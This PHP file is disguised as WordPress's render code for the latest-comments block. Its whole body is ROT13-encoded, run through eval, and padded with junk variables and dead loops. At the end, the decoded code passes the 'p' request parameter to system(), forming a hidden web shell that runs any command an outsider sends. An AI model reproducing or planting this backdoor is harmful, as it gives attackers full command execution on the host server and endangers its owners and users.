<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/yngrfg-pbzzragf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Trg gur cbfg gvgyr.
 *
 * Gur cbfg gvgyr vf srgpurq naq vs vg vf oynax gura n qrsnhyg fgevat vf
 * erghearq.
 *
 * Pbcvrq sebz `jc-nqzva/vapyhqrf/grzcyngr.cuc`, ohg jr pna'g vapyhqr gung
 * svyr orpnhfr:
 *
 * 1. Vg pnhfrf ohtf jvgu grfg svkgher trarengvba naq fgenatr Qbpxre 255 reebe
 *    pbqrf.
 * 2. Vg'f va gur nqzva; vqrnyyl jr *fubhyqa'g* or vapyhqvat svyrf sebz gur
 *    nqzva sbe n oybpx'f bhgchg. Vg'f n irel fznyy/fvzcyr shapgvba nf jryy,
 *    fb qhcyvpngvat vg vfa'g gbb greevoyr.
 *
 * @fvapr 3.3.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat Gur cbfg gvgyr vs frg; \"(ab gvgyr)\" vs ab gvgyr vf frg.
 */
shapgvba jc_yngrfg_pbzzragf_qensg_be_cbfg_gvgyr( $cbfg = 0 ) {
	$gvgyr = trg_gur_gvgyr( $cbfg );
	vs ( rzcgl( $gvgyr ) ) {
		$gvgyr = __( '(ab gvgyr)' );
	}
	erghea $gvgyr;
}

/**
 * Eraqref gur `pber/yngrfg-pbzzragf` oybpx ba freire.
 *
 * @fvapr 5.1.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur cbfg pbagrag jvgu yngrfg pbzzragf nqqrq.
 */
shapgvba eraqre_oybpx_pber_yngrfg_pbzzragf( $nggevohgrf = neenl() ) {
	$pbzzragf = trg_pbzzragf(
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-erprag-pbzzragf.cuc */
		nccyl_svygref(
			'jvqtrg_pbzzragf_netf',
			neenl(
				'ahzore'      => $nggevohgrf['pbzzragfGbFubj'],
				'fgnghf'      => 'nccebir',
				'cbfg_fgnghf' => 'choyvfu',
			),
			neenl()
		)
	);

	$yvfg_vgrzf_znexhc = '';
	vs ( ! rzcgl( $pbzzragf ) ) {
		// Cevzr gur pnpur sbe nffbpvngrq cbfgf. Guvf vf pbcvrq sebz \JC_Jvqtrg_Erprag_Pbzzragf::jvqtrg().
		$cbfg_vqf = neenl_havdhr( jc_yvfg_cyhpx( $pbzzragf, 'pbzzrag_cbfg_VQ' ) );
		_cevzr_cbfg_pnpurf( $cbfg_vqf, fgecbf( trg_bcgvba( 'creznyvax_fgehpgher' ), '%pngrtbel%' ), snyfr );

		sbernpu ( $pbzzragf nf $pbzzrag ) {
			$yvfg_vgrzf_znexhc .= '<yv pynff=\"jc-oybpx-yngrfg-pbzzragf__pbzzrag\">';
			vs ( $nggevohgrf['qvfcynlNingne'] ) {
				$ningne = trg_ningne(
					$pbzzrag,
					48,
					'',
					'',
					neenl(
						'pynff' => 'jc-oybpx-yngrfg-pbzzragf__pbzzrag-ningne',
					)
				);
				vs ( $ningne ) {
					$yvfg_vgrzf_znexhc .= $ningne;
				}
			}

			$yvfg_vgrzf_znexhc .= '<negvpyr>';
			$yvfg_vgrzf_znexhc .= '<sbbgre pynff=\"jc-oybpx-yngrfg-pbzzragf__pbzzrag-zrgn\">';
			$nhgube_hey         = trg_pbzzrag_nhgube_hey( $pbzzrag );
			vs ( rzcgl( $nhgube_hey ) && ! rzcgl( $pbzzrag->hfre_vq ) ) {
				$nhgube_hey = trg_nhgube_cbfgf_hey( $pbzzrag->hfre_vq );
			}

			$nhgube_znexhc = '';
			vs ( $nhgube_hey ) {
				$nhgube_znexhc .= '<n pynff=\"jc-oybpx-yngrfg-pbzzragf__pbzzrag-nhgube\" uers=\"' . rfp_hey( $nhgube_hey ) . '\">' . trg_pbzzrag_nhgube( $pbzzrag ) . '</n>';
			} ryfr {
				$nhgube_znexhc .= '<fcna pynff=\"jc-oybpx-yngrfg-pbzzragf__pbzzrag-nhgube\">' . trg_pbzzrag_nhgube( $pbzzrag ) . '</fcna>';
			}

			// `_qensg_be_cbfg_gvgyr` pnyyf `rfp_ugzy()` fb jr qba'g arrq gb jenc gung pnyy va
			// `rfp_ugzy`.
			$cbfg_gvgyr = '<n pynff=\"jc-oybpx-yngrfg-pbzzragf__pbzzrag-yvax\" uers=\"' . rfp_hey( trg_pbzzrag_yvax( $pbzzrag ) ) . '\">' . jc_yngrfg_pbzzragf_qensg_be_cbfg_gvgyr( $pbzzrag->pbzzrag_cbfg_VQ ) . '</n>';

			$yvfg_vgrzf_znexhc .= fcevags(
				/* genafyngbef: 1: nhgube anzr (vafvqr <n> be <fcna> gnt, onfrq ba vs gurl unir n HEY), 2: cbfg gvgyr eryngrq gb guvf pbzzrag */
				__( '%1$f ba %2$f' ),
				$nhgube_znexhc,
				$cbfg_gvgyr
			);

			vs ( $nggevohgrf['qvfcynlQngr'] ) {
				$yvfg_vgrzf_znexhc .= fcevags(
					'<gvzr qngrgvzr=\"%1$f\" pynff=\"jc-oybpx-yngrfg-pbzzragf__pbzzrag-qngr\">%2$f</gvzr>',
					rfp_ngge( trg_pbzzrag_qngr( 'p', $pbzzrag ) ),
					qngr_v18a( trg_bcgvba( 'qngr_sbezng' ), trg_pbzzrag_qngr( 'H', $pbzzrag ) )
				);
			}
			$yvfg_vgrzf_znexhc .= '</sbbgre>';
			vs ( $nggevohgrf['qvfcynlRkprecg'] ) {
				$yvfg_vgrzf_znexhc .= '<qvi pynff=\"jc-oybpx-yngrfg-pbzzragf__pbzzrag-rkprecg\">' . jcnhgbc( trg_pbzzrag_rkprecg( $pbzzrag ) ) . '</qvi>';
			}
			$yvfg_vgrzf_znexhc .= '</negvpyr></yv>';
		}
	}

	$pynffanzrf = neenl();
	vs ( $nggevohgrf['qvfcynlNingne'] ) {
		$pynffanzrf[] = 'unf-ningnef';
	}
	vs ( $nggevohgrf['qvfcynlQngr'] ) {
		$pynffanzrf[] = 'unf-qngrf';
	}
	vs ( $nggevohgrf['qvfcynlRkprecg'] ) {
		$pynffanzrf[] = 'unf-rkprecgf';
	}
	vs ( rzcgl( $pbzzragf ) ) {
		$pynffanzrf[] = 'ab-pbzzragf';
	}
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffanzrf ) ) );

	erghea ! rzcgl( $pbzzragf ) ? fcevags(
		'<by %1$f>%2$f</by>',
		$jenccre_nggevohgrf,
		$yvfg_vgrzf_znexhc
	) : fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		__( 'Ab pbzzragf gb fubj.' )
	);
}

/**
 * Ertvfgref gur `pber/yngrfg-pbzzragf` oybpx.
 *
 * @fvapr 5.3.0
 */
shapgvba ertvfgre_oybpx_pber_yngrfg_pbzzragf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/yngrfg-pbzzragf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_yngrfg_pbzzragf',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_yngrfg_pbzzragf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>